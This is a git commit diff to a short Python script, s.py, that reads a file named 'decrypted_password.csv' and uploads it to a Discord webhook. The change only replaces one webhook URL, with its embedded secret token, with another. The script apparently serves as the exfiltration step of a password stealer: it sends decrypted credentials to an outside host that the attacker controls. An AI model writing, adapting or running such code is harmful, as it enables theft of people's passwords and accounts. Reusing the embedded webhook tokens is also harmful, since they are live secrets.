b0525b9a1ce532b3e925450c08fc190383e4ecd3
Ishan Leung <34925387+ishan211@users.noreply.github.com>
2025-05-08 18:49:52 -0400

    Update s.py

--- s.py
+++ s.py
@@ -1,6 +1,6 @@
 from discord_webhook import DiscordWebhook
 
-webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1309056017325101078/GiBQU99oAA3nXhAXPXf89w3KiBk9SKeSmsy7b6_D1WViq85pyVQBO0UdItPtE469rmac")
+webhook = DiscordWebhook(url="https://discordapp.com/api/webhooks/1370169947359154301/iVEP_rnJDMJqWMv5vfSQUfz5rAgN5mvLQLYM7Fu31WZ1qRcjiPMAtIAmWCTpSZNQcTb9")
 
 with open("decrypted_password.csv", "rb") as f:
     webhook.add_file(file=f.read(), filename="decrypted_password.csv")
